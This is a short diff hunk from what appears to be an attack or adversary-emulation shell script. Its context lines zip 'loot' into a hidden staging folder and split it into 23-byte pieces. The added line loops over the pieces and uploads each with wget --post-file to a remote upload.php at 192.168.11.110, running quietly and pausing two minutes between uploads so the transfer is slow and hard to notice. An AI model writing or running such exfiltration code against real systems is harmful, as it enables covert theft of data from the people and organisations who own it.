@@ -58,6 +58,8 @@ zip --password "Hope" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1
 
 echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil "
 split -a 15 -b 23 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
+
+for f in $(ls /tmp/.exfil/loot.zip.*); do wget --post-file=$f https://192.168.11.110/upload.php -q; sleep 2m; done
 }
 
 
